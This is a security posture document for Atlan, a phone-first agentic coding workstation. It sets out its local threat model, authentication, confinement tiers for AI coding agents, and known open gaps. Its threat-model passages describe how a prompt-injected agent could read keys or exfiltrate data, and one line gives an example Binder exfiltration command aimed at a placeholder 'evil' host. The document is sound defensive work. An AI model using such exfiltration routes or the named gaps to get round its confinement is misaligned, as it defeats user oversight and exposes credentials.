# Atlan security posture (honest)

**Status: VERIFIED against code 2026-08-02.** Written 2026-07-22 after a four-model adversarial review (ChatGPT, Claude, Gemini, Grok); every claim below was re-checked line-by-line on 2026-08-02 and three were found stale (preview proxy, ReDoS, Bash sandbox — all corrected in place). This doc is kept truthful on purpose — earlier versions drifted from the code, which reviewers rightly flagged, and drift recurred within two weeks. Re-verify on every security-relevant change.

**Atlan is loopback-only.** Cockpit :4589, preview proxy :4590, llama-server :8080 bind 127.0.0.1. Nothing is reachable from the internet. The in-app **Preflight** (Doctor tab) gates any exposure.

## Primary host is the PHONE

**Atlan is a phone-first mobile development and agentic workstation.** Android/Termux/proot is the *primary* target; a PC/WSL2 home node is an **accessory that extends the mobile workstation**, never the other way round. Every default below is chosen for the phone, and a capability the phone lacks is an *addition* on a bigger host — not a correction of the phone.

That matters here because the boundary genuinely differs by host, and the difference is **detected, not assumed**:

| | phone (Termux/proot) — PRIMARY | home node (Linux/WSL2) — ACCESSORY |
|---|---|---|
| user namespaces | none | present |
| kernel-enforced Bash sandbox | **unavailable** | available (bubblewrap/seccomp; Landlock verified for `codex -s`) |
| agent confinement | *contained* — tool profile, path guards, worktree | can additionally be *gated* by the kernel |
| long autonomous runs | thermally/OOM fragile | fine |

**The accessory's real job:** `SECURITY.md` has always said untrusted autonomous shell work needs a real sandboxed host. The phone cannot be that host. **The home node can be the place the phone offloads to** — which makes the mobile workstation safer without moving the cockpit off the phone.

## The honest threat model (read this first)
The realistic risk is **not** "someone on the internet connects to port 4589." It's **local**:
- **On Android, loopback is not a boundary between apps.** Any installed app with INTERNET permission can reach `127.0.0.1:<port>`. proot doesn't change that — Termux shares the device network stack. So the password gate is what actually protects the authenticated surface, and **unauthenticated loopback surfaces (the preview proxy) are reachable by any app on the phone.**
- **Inside proot, an agent with Bash is effectively root of the Termux user.** There's no OS sandbox (bubblewrap/Landlock don't run in proot — tested). Prompt-injected or malicious code an agent runs can read the (decryptable-by-design) key store, alter files, or stage exfiltration through allowed provider traffic. proot confines this to the Termux app sandbox (it can't touch other Android apps), but **everything Atlan can reach — your repos, its own state, provider creds in proot — is in blast radius.**
- **"Run untrusted work on a native host" is honest only stated bluntly:** phone mode is for *trusted* personal projects. Untrusted autonomous shell work needs a real sandboxed host — and even there, Atlan must actually enable FS/network isolation and keep secrets out of the worker. It is not a cop-out only if we say exactly this.

## What exists today (matches the code)
- **Auth:** password (scrypt, per-instance) + httpOnly `SameSite=Strict` session cookie surviving restarts; **session tokens hashed at rest** (sha256 in `sessions.json` — reading the file can't replay); **password change revokes all sessions**; failed-login throttle; automation bearer via header (never a URL). `Secure` cookie flag when `ATLAN_SECURE_COOKIE` is set (behind TLS).
- **Origin pinning:** every mutating `/api` request and the WS upgrade reject a cross-origin `Origin` (DNS-rebinding / cross-site-WS defense); no-Origin automation is bearer-gated.
- **Preview→agent channel pinned:** the cockpit only accepts `postMessage` from the actual preview frame origin (was an unpinned prompt-injection path). Content from preview is still treated as adversarial.
- **Path guards:** reads/writes/attach confined under the project root, credential-name denylist, and **realpath checks of the nearest existing ancestor** (blocks symlink escape, incl. new files under a symlinked parent).
- **Fleet:** Scout tools stripped at the SDK level (`disallowedTools` + `settingSources:[]`); per-run hard budget; **global daily token cap + concurrency cap** so concurrent runs can't multiply past the wall.
- **Keys:** AES-256-GCM at rest, 0600 secret, last-4 only. Honest limit: decryptable by design (the app must send keys to providers).
- **Deterministic checkers:** exact membership (not substring), safe arithmetic (no `eval`), constrained decoding.

<!-- BEGIN confinement-tiers (generated from server/src/sandbox/tiers.js) -->
## Confinement tiers — what each one actually enforces

Atlan compiles a small launcher (`server/native/atlan-confine.c`) at first use and measures what THIS device will enforce **by attempting every operation on this boot** — never by reading a flag file. That rule is not fastidiousness: `/sys/kernel/security/lsm` reads `n/a` on hosts where Landlock is actively enforcing, and `/proc/sys/user/max_user_namespaces` is registered unconditionally by `kernel/ucount.c` with no `CONFIG_USER_NS` guard, so it reads a large positive number on a kernel built *without* user namespaces. A run declares the tier it needs; if the device establishes less, **the run does not start** and the Doctor names the rung that said no.

These sentences live in `server/src/sandbox/tiers.js` and are quoted here verbatim. `test/docdrift.mjs` fails the commit that lets the two diverge.

### T0 — no confinement established

**No OS confinement on this run.** The agent runs as your user with no syscall filter and no filesystem boundary. It is working in a disposable copy of your project and nothing reaches your real tree until you approve a diff — that is containment against error, not against attack. This run was explicitly allowed to start ungated.

### T1 — capability removal (the phone, today)

**Capability removal, enforced by the kernel.** Before this agent started, Atlan installed a syscall filter it cannot remove and that every process it spawns inherits. It cannot use `io_uring`, `ptrace`, `process_vm_writev`, `pidfd_getfd`, `userfaultfd`, `bpf`, `perf_event_open`, `keyctl`, `unshare`, `setns`, `mount`, or the 32-bit syscall table.

**It does not confine the filesystem.** On an unrooted Android device there is no filesystem boundary available to an app — not to Atlan, not to anything. This agent can still read every file your Termux user can read, including the other agent CLIs' saved logins. Its writes go to a disposable copy and nothing reaches your project until you approve a diff.

**This is capability removal plus containment against error. It is not a sandbox.**

### T2 — capability removal + egress denial (Bash children, any host)

**Everything in T1, and this shell cannot open a network socket.** `socket()` is refused by the kernel for every address family, including AF_UNIX — so it cannot reach the internet, cannot reach Atlan's own cockpit on loopback, and cannot smuggle data out through Android's DNS resolver socket. The refusal is inherited by anything it starts.

**This applies to shell commands the agent runs. It does not apply to the agent itself** — an agent CLI is the thing talking to the model provider, so its own connection stays open by necessity.

### T3 — capability removal + egress + filesystem (accessory node)

**Everything above, and a real filesystem boundary.** Paths outside this workspace and its toolchain do not resolve for this agent — the kernel refuses at `open()`, and the refusal is inherited by every process it starts. Only this engine's own saved login is readable; the other CLIs' tokens, your SSH keys and Atlan's key store are outside the grant.

**Honest limits:** it does not cover file descriptors the agent was handed at startup, it does not hook `stat`/`chmod`/`chown`, and a network-capable process inside the boundary can still send out what it can read.

### When the probe says no to Landlock

**Filesystem confinement: unavailable on this device.** Not disabled, not skipped — Android's own app syscall filter kills the calls that would create it. Atlan checks by attempting it every boot; if a future Android permits it, this turns green without a code change.

### Measured, and not yet measured

**WSL2 accessory node, 2026-08-05: 15/15 rungs green, established T3.** The PHONE numbers are **unmeasured**. `declaredTier()` therefore defaults to **T0 on every host** until an on-device transcript is attached — and T0 is not a silent degrade, it says out loud that the run was explicitly allowed to start ungated. Raising the phone default is a commit that carries a phone ladder transcript, not a config change.

**Not covered in v1**, named here so nobody assumes coverage the code does not have: `build.js:71` (`bash -c script`), `pty.js:46` (Term tab) and `studio.js:72` still spawn unwrapped. IP-1 egress stays open **by necessity** — an agent CLI is the process talking to the model provider — so a prompt-injected agent still has a bidirectional channel to a host we blessed; nothing here sees Binder (`am start -a android.intent.action.VIEW -d https://evil/?data` exfiltrates through another UID with no socket call at all), and a write into shared storage leaves via a sync app. Those holes stay open and none of the strings above imply otherwise.

**This is not a sandbox on the phone, and no amount of this code makes one.** There is no filesystem boundary available to an unrooted Android app. `CONFIG_USER_NS` is default-n and absent from every GKI arm64 defconfig 5.10→6.12, `CONFIG_PID_NS` is explicitly unset, and `mount`/`umount2`/`chroot` are SIGSYS-killed by the inherited zygote filter — so the bubblewrap family is not weak there, it is absent, and writing code against namespaces for Android is writing code that cannot execute. proot is ptrace path rewriting at the same uid under the same inherited filter and grants zero capabilities; it is never part of the boundary.

<!-- END confinement-tiers -->
## Known gaps — status verified 2026-08-02

Each carries its real state. "Partial" means a vector was closed and a narrower one remains; saying "open" for those understates work already done, and saying "closed" would overstate it.

- **OPEN · Bash is not OS-sandboxed on the phone.** Builder/verifier Bash is host execution as the Termux user — gated by tool *profile*, not the OS. "Writes scoped to project" is true of the SDK Write/Edit tools, **not** Bash. Honest labels: Scout = SDK-read-only; Builder/Verifier = full host execution. **Unfixable on proot** (no user namespaces) and correctly so — see the next line for what *is* available.
- **PARTIAL · OS sandbox exists for the fleet, opt-in.** `ATLAN_SANDBOX=1` (`config.js` `sandboxEnabled()`/`sandboxOption()`) passes the Agent SDK's `sandbox` option on autonomous fleet runs (`fleet.js` `exec()`), confining Bash via bubblewrap/seccomp **where the host has user namespaces**. `failIfUnavailable:false` so it degrades honestly on proot rather than lying about the boundary; the Doctor reports which it got. Off by default; deliberately not applied to interactive Chat, which is human card-gated. **Remaining gap: the exec-mode CLI path is still ungated** — `agents.js` and `studio.js` launch the four CLIs full-auto, because an exec-mode CLI is all-or-nothing on approvals and has no per-tool callback to hang a card on. That is a real constraint, not a shortcut. What changed on **2026-08-06**: the bypass flags no longer live as literals in `agents.js` — they come from `enginePolicy.interactiveGate()`, which carries `gated:false` alongside them, and `preflight.js` reads the *same table* to build its permission-gate row. Before that, `preflight.js` rendered a hardcoded green row reading "every dangerous tool asks you first" while these four ran with their gates off; four of five engines contradicted the one check a user is told to trust before exposing the cockpit.
- **PARTIAL · Preview proxy (:4590).** *Was* an open unauthenticated loopback; **gated 2026-07-24 (`7caee01`)** with an anti-rebinding **Host + Origin** check (`preview.js` `previewOriginOk()`). Closed: DNS-rebinding and cross-site fetch/WS — the browser-reachable vectors. **Still open: a NATIVE local app can forge Host and omit Origin.** On Android that is the realistic threat, since any installed app with INTERNET permission reaches loopback. Only a secret token stops it, which is deliberately kept out of the URL.
- **PARTIAL · Budgets are post-step, not stream-level.** Mitigated 2026-07-24: `TURN_RESERVE` (`config.js`, default 16k, capped at ½ budget via `fleet.js` `reserveFor()`) stops authorizing new turns *below* the raw budget, bounding overshoot to roughly one in-flight turn instead of a whole generation. Residual: that one turn.
- **CLOSED · regex checkers can ReDoS.** Shut at **authoring**, not at runtime: `unsafeRegex()` (`personas.js:106`) walks the pattern and rejects quantified groups containing a quantifier — the catastrophic-backtracking shape — so `upsertCommand` throws and such a pattern can never be saved (`personas.js:147`). Unit-tested (`test/unit.mjs:219–225`). A 10k input cap remains as a backstop (`personas.js:213`). RE2 or an engine-level timeout is still the ideal, but the door is shut. *This line said "open" until 2026-08-02 while `REVIEW-FINDINGS.md` already recorded the fix — the two docs had diverged.*
- **OPEN · TOCTOU on path guards** (check-then-use) — low severity single-user; a real fix needs openat2/dir-fd confinement.
- **OPEN by design · Self-repair.** A git worktree is source-tree hygiene, not an execution sandbox — verifying a malicious patch runs its code. Stage 2 must run in a real sandbox with an *immutable, external* test oracle and gate/checker code the loop can never touch. Until then it is **AI-assisted patch proposal**, not autonomous self-repair. Off by default.
- **OPEN · Debugger (unmerged).** helis-d's CDP bridge forwards raw client commands to the V8 inspector and takes a client-supplied `scriptPath`. Correctly parked. Note an allowlist of "stepping + setBreakpoint" is **still RCE** — `Debugger.evaluateOnCallFrame` and conditional breakpoints both evaluate arbitrary JS.

**Verified by BEHAVIOUR, 2026-08-06** — `test/walls.mjs`. Each of these is asserted
by making the thing happen and looking at the answer: origin pinning on non-GET
`/api` and on the WS upgrade · session tokens sha256 at rest, *and the absence of
anything replayable in the store* · realpath symlink guard · `settingSources:[]`
\+ `disallowedTools` · daily token cap · concurrency cap · budget clamp ·
in-flight budget reservation · AES-256-GCM key store · `atomicWrite` temp+rename
preserving 0600 · `ATLAN_SECURE_COOKIE` / `ATLAN_ORIGIN` · the failed-login
throttle · session revocation on password change · the preview proxy's gate on
**both** the HTTP path and the WS upgrade · `scrubbedEnv`'s explicit DROP list.

*This list used to end in pinned LINE NUMBERS ("`fleet.js:140,143`"), spot-checked
once. Two things were wrong with that. The numbers rotted — `fleet.js` had grown
past most of them by 100–185 lines, so a reader following a citation to verify a
claim landed on unrelated code and could reasonably conclude the claim was
false, which is the opposite of what the citation was for. And "spot-checked"
meant read, not exercised: a mutation pass on 2026-08-06 neutered twelve of the
controls named here and the full 21-suite gate stayed green for every one,
because the tests behind them grepped source text. Citations are by SYMBOL now —
a name survives an edit, a line number cannot — and the verification is a suite
you can run rather than a date someone wrote down.*

## Exposure plan (only after Preflight green)
- Workers/Pages **cannot** host the server (needs real Linux: tmux, node-pty, Claude Code). Only the static shell is Wrangler-deployable.
- Remote access = **cloudflared tunnel** → hostname, gated by **Cloudflare Access** (IdP/OTP), pointing at 127.0.0.1:4589. Set `ATLAN_SECURE_COOKIE=1` and `ATLAN_ORIGIN=<tunnel origin>` when tunneling. Phone stays the compute.
- Even then: keep untrusted/autonomous shell work off the phone.
